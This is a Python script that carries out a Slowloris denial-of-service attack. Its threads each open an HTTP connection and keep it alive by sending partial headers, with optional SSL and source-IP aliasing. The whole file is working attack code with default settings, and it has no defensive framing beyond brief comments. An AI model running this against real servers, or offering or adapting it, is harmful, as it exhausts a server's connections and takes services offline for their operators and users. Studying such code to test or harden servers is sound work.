import socket
import ssl
import threading
import random
import time
from ipaddress import IPv4Address

# Configuration variables
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8080
NUM_THREADS = 3
REQUEST_INTERVAL = 2
IP_ALIASING = False
ALIAS_IP_RANGE = "172.18.1.100/24"

def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    ]
    return random.choice(user_agents)

def generate_random_ip(ip_range):
    network = IPv4Address(ip_range.split("/")[0])
    prefix = int(ip_range.split("/")[1])
    max_hosts = 2 ** (32 - prefix) - 2
    random_host = random.randint(10, max_hosts)
    return str(network + random_host)

def slowloris_attack(target_host, target_port, use_ip_aliasing=False, alias_ip_range=None):
    try:
        # Create a socket connection
        if target_port == 443:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock = ssl.wrap_socket(sock)  # Use SSL for HTTPS
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Bind to a random IP if IP aliasing is enabled
        if use_ip_aliasing:
            alias_ip = generate_random_ip(alias_ip_range)
            sock.bind((alias_ip, 0))

        # Connect to the target
        sock.connect((target_host, target_port))

        # Send the initial HTTP request
        request = (
            f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n"
            f"Host: {target_host}\r\n"
            f"User-Agent: {get_random_user_agent()}\r\n"
            f"Connection: keep-alive\r\n"
        )
        sock.send(request.encode("utf-8"))

        while True:
            # Send partial headers to keep the connection alive
            header = f"X-a: {random.randint(0, 5000)}\r\n"
            sock.send(header.encode("utf-8"))
            time.sleep(REQUEST_INTERVAL)

    except Exception as e:
        print(f"Error in thread: {e}")
    finally:
        sock.close()

# Main function to start the attack
def main():
    print(f"Starting Slowloris attack on {TARGET_HOST}:{TARGET_PORT} with {NUM_THREADS} threads.")
    threads = []

    for i in range(NUM_THREADS):
        thread = threading.Thread(
            target=slowloris_attack,
            args=(TARGET_HOST, TARGET_PORT, IP_ALIASING, ALIAS_IP_RANGE)
        )
        thread.daemon = True
        thread.start()
        threads.append(thread)

    # Keep the main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping the attack...")
        for thread in threads:
            thread.join()

if __name__ == "__main__":
    main()
